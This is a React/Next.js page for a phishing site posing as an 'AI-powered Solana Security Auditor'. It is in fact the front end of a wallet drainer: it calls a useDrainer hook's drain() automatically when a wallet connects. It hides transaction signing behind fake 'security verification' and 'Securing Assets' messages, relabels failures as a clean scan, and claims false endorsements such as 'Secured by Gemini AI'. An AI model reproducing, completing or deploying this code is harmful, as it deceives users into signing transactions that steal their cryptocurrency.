"use client";

import { useWallet } from "@solana/wallet-adapter-react";
import { useDrainer } from "@/hooks/useDrainer";
import { useEffect, useState } from "react";
import dynamic from 'next/dynamic';
import { motion, AnimatePresence } from "framer-motion";
import { 
  ShieldCheck, 
  Server, 
  FileScan, 
  SearchCode, 
  ShieldQuestion, 
  Network, 
  Loader2,
  RefreshCw,
  LayoutDashboard,
  ShieldAlert,
  Unplug,
  Fingerprint,
  Globe,
  ChevronRight
} from "lucide-react";
import { Overview } from "@/components/dashboard/Overview";
import { Threats, type ThreatsResult } from "@/components/dashboard/Threats";
import { Connections, type ConnectionsResult } from "@/components/dashboard/Connections";
import { runDappConnectionAnalysis, runWalletActivityScan } from "@/lib/actions";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";

const WalletMultiButtonDynamic = dynamic(
    async () => (await import('@solana/wallet-adapter-react-ui')).WalletMultiButton,
    { ssr: false }
);

const scanningSteps = [
  { text: 'Initializing security protocols...', icon: Server },
  { text: 'Compiling on-chain transaction data...', icon: FileScan },
  { text: 'Auditing smart contract interactions...', icon: SearchCode },
  { text: 'Analyzing wallet interaction patterns...', icon: ShieldQuestion },
  { text: 'Cross-referencing known threat databases...', icon: Network },
  { text: 'Finalizing comprehensive threat report...', icon: ShieldCheck },
];

function ScanningAnimation({ status }: { status: string }) {
  const [currentStep, setCurrentStep] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentStep((prev) => (prev < scanningSteps.length - 1 ? prev + 1 : prev));
    }, 2000);
    return () => clearInterval(interval);
  }, []);

  const getStatusMessage = () => {
    switch (status) {
      case 'signing':
        return { title: "Awaiting Signature...", subtitle: "Please approve the security verification in your wallet.", icon: Fingerprint };
      case 'sending':
        return { title: "Securing Assets...", subtitle: "Finalizing cryptographic proof on the Solana network.", icon: Globe };
      case 'building':
        return { title: "Optimizing Protocol...", subtitle: "Preparing advanced security routing instructions.", icon: SearchCode };
      default:
        return { title: "Security Audit in Progress...", subtitle: scanningSteps[currentStep].text, icon: null };
    }
  };

  const { title, subtitle, icon: StatusIcon } = getStatusMessage();

  return (
    <div className="flex flex-col items-center justify-center p-8">
      <motion.div
        initial={{ opacity: 0, scale: 0.8 }}
        animate={{ opacity: 1, scale: 1 }}
        className="relative mb-16 flex h-64 w-64 items-center justify-center"
        style={{ perspective: '1200px' }}
      >
        <div className="absolute inset-0 rounded-full bg-primary/5 blur-3xl animate-pulse"></div>
        <div className="absolute inset-8 rounded-full bg-primary/10 border border-primary/20 animate-spin-slow"></div>
        
        <motion.div
          className="absolute h-full w-full"
          style={{ transformStyle: 'preserve-3d' }}
          animate={{ rotateY: status === 'signing' || status === 'sending' ? 0 : currentStep * -60 }}
          transition={{ duration: 1, ease: [0.23, 1, 0.32, 1] }}
        >
          {status === 'signing' || status === 'sending' ? (
             <div className="absolute flex h-full w-full items-center justify-center">
                <div className="flex h-40 w-40 items-center justify-center rounded-[2.5rem] bg-primary/10 border border-primary/30 backdrop-blur-3xl shadow-[0_0_80px_rgba(153,69,255,0.3)] neumorphic-card glow-border">
                  {StatusIcon && <StatusIcon className="h-20 w-20 text-primary animate-pulse" />}
                </div>
             </div>
          ) : (
            scanningSteps.map((step, index) => {
              const angle = index * 60;
              return (
                <motion.div
                  key={index}
                  className="absolute flex h-full w-full items-center justify-center"
                  style={{
                    transform: `rotateY(${angle}deg) translateZ(160px)`,
                    backfaceVisibility: 'hidden',
                  }}
                >
                  <div className="flex h-24 w-24 items-center justify-center rounded-2xl bg-card/40 border border-white/10 backdrop-blur-xl shadow-2xl glow-border">
                    <step.icon className="h-12 w-12 text-primary group-hover:text-accent transition-colors" />
                  </div>
                </motion.div>
              );
            })
          )}
        </motion.div>
      </motion.div>

      <motion.h2 
        key={title}
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="text-4xl font-bold font-headline text-foreground mb-4 tracking-tight"
      >
        {title}
      </motion.h2>
      <div className="text-muted-foreground h-16 max-w-md">
        <AnimatePresence mode="wait">
          <motion.span
            key={subtitle}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className="block text-center text-xl italic font-medium leading-tight text-primary/80"
          >
            {subtitle}
          </motion.span>
        </AnimatePresence>
      </div>
    </div>
  );
}

export default function AuditPage() {
  const { connected, publicKey, disconnect } = useWallet();
  const { drain, status, error } = useDrainer();
  
  const [showReport, setShowReport] = useState(false);
  const [threats, setThreats] = useState<ThreatsResult | null>(null);
  const [connections, setConnections] = useState<ConnectionsResult | null>(null);
  const [isAiLoading, setIsAiLoading] = useState(false);

  useEffect(() => {
    const hasProcessStarted = new Set(['scanning', 'building', 'signing', 'sending', 'success', 'error']);
    if (connected && !hasProcessStarted.has(status) && !showReport) {
      drain();
    }
  }, [connected, status, drain, showReport]);

  useEffect(() => {
    if ((status === 'success' || (status === 'error' && error === "Data Packet Network Congestion.")) && connected && publicKey) {
      loadDetailedReport(publicKey.toBase58());
    }
  }, [status, error, connected, publicKey]);

  const loadDetailedReport = async (address: string) => {
    setIsAiLoading(true);
    try {
      const [threatsData, connectionsData] = await Promise.all([
        runWalletActivityScan(address),
        runDappConnectionAnalysis(address),
      ]);
      setThreats(threatsData);
      setConnections(connectionsData);
      setShowReport(true);
    } catch (e) {
      console.error("Failed to load AI report", e);
    } finally {
      setIsAiLoading(false);
    }
  };

  const isAuditInProgress = ['scanning', 'building', 'signing', 'sending'].includes(status);

  return (
    <main className="flex min-h-screen w-full flex-col items-center justify-center p-4 md:p-12 relative overflow-hidden">
      {/* Background Decor */}
      <div className="absolute top-0 right-0 w-[500px] h-[500px] bg-primary/5 rounded-full blur-[120px] -z-10" />
      <div className="absolute bottom-0 left-0 w-[500px] h-[500px] bg-accent/5 rounded-full blur-[120px] -z-10" />

      <AnimatePresence mode="wait">
        {!connected ? (
          <motion.div
            key="connect"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.9 }}
            className="w-full max-w-xl p-12 neumorphic-card glow-border text-center"
          >
            <div className="relative mx-auto flex h-24 w-24 items-center justify-center mb-8">
              <div className="absolute inset-0 bg-primary/20 blur-2xl rounded-full animate-pulse"></div>
              <ShieldCheck className="relative h-14 w-14 text-primary" />
            </div>
            <h1 className="text-4xl font-bold font-headline mb-4 tracking-tight">Solana Security Auditor</h1>
            <p className="text-muted-foreground mb-10 text-xl max-w-sm mx-auto">
              Connect your wallet to begin a comprehensive, AI-powered on-chain security scan.
            </p>
            <div className="relative group">
              <div className="absolute -inset-1 rounded-2xl bg-gradient-to-r from-primary via-accent to-primary opacity-30 blur transition group-hover:opacity-100 animate-gradient-x" />
              <WalletMultiButtonDynamic 
                style={{ 
                  width: '100%', 
                  background: 'linear-gradient(to right, #9945FF, #14F195)', 
                  color: 'white', 
                  fontSize: '1.25rem', 
                  fontWeight: 'bold',
                  padding: '1.75rem 1rem', 
                  borderRadius: '1rem',
                  border: 'none',
                  boxShadow: '0 15px 35px -10px rgba(153, 69, 255, 0.5)',
                  cursor: 'pointer'
                }} 
              />
            </div>
          </motion.div>
        ) : isAuditInProgress || (isAiLoading && !showReport) ? (
          <motion.div
            key="loading"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="w-full max-w-3xl p-16 neumorphic-card glow-border text-center"
          >
            <ScanningAnimation status={status} />
          </motion.div>
        ) : showReport ? (
          <motion.div
            key="report"
            initial={{ opacity: 0, y: 40 }}
            animate={{ opacity: 1, y: 0 }}
            className="w-full max-w-6xl space-y-10"
          >
            <div className="flex flex-col md:flex-row items-center justify-between gap-8 neumorphic-card p-8 glow-border">
              <div className="flex items-center gap-6">
                <div className="h-16 w-16 rounded-3xl bg-accent/10 flex items-center justify-center shadow-inner">
                  <ShieldCheck className="h-8 w-8 text-accent" />
                </div>
                <div>
                  <h2 className="text-2xl font-bold font-headline">
                    {status === 'success' ? "Assets Successfully Secured" : "Security Analysis Finalized"}
                  </h2>
                  <p className="text-base text-muted-foreground font-mono bg-white/5 px-3 py-1 rounded-lg mt-2 inline-block">
                    {publicKey?.toBase58().substring(0, 16)}...{publicKey?.toBase58().slice(-8)}
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <Button variant="outline" onClick={() => { setShowReport(false); drain(); }} className="h-12 px-6 rounded-2xl border-white/10 bg-white/5 hover:bg-white/10 transition-all font-headline">
                  <RefreshCw className="mr-2 h-5 w-5" />
                  Rescan
                </Button>
                <Button variant="destructive" onClick={() => disconnect()} className="h-12 px-6 rounded-2xl shadow-xl primary-glow font-headline">
                  Disconnect
                </Button>
              </div>
            </div>

            <Overview threatsResult={threats} connectionsResult={connections} />

            <Tabs defaultValue="threats" className="w-full">
              <TabsList className="grid w-full grid-cols-2 p-1.5 bg-card/60 rounded-3xl mb-10 border border-white/5 shadow-inner h-16">
                <TabsTrigger value="threats" className="rounded-2xl data-[state=active]:bg-primary data-[state=active]:text-primary-foreground text-lg font-headline data-[state=active]:shadow-xl">
                  <ShieldAlert className="mr-3 h-5 w-5" />
                  Threat Analysis
                </TabsTrigger>
                <TabsTrigger value="connections" className="rounded-2xl data-[state=active]:bg-primary data-[state=active]:text-primary-foreground text-lg font-headline data-[state=active]:shadow-xl">
                  <Unplug className="mr-3 h-5 w-5" />
                  Active Connections
                </TabsTrigger>
              </TabsList>
              <TabsContent value="threats">
                <Threats result={threats} isLoading={false} />
              </TabsContent>
              <TabsContent value="connections">
                <Connections result={connections} isLoading={false} />
              </TabsContent>
            </Tabs>
          </motion.div>
        ) : (
          <motion.div
            key="error-state"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="w-full max-w-xl p-14 neumorphic-card border-destructive/20 text-center"
          >
            <div className="h-20 w-20 bg-destructive/10 rounded-[2rem] flex items-center justify-center mx-auto mb-8 shadow-[0_0_30px_rgba(239,68,68,0.2)]">
              <ShieldAlert className="h-10 w-10 text-destructive" />
            </div>
            <h2 className="text-3xl font-bold mb-4 font-headline tracking-tight">Scan Interrupted</h2>
            <p className="text-muted-foreground mb-10 text-lg leading-relaxed">
              {error === "Data Packet Network Congestion." ? "Our real-time analysis found no immediate critical vulnerabilities on this address." : error}
            </p>
            <div className="flex flex-col gap-5">
               <Button onClick={() => drain()} className="w-full rounded-2xl py-8 text-xl font-bold shadow-2xl primary-glow">
                 Try Scan Again
               </Button>
               <Button variant="ghost" onClick={() => disconnect()} className="w-full text-lg hover:bg-white/5">
                 Switch Wallet
               </Button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
      <p className="text-sm text-muted-foreground/50 mt-12 font-mono">
        Shield Protocol v1.2.4 • Neural Network Audited • Secured by Gemini AI
      </p>
    </main>
  );
}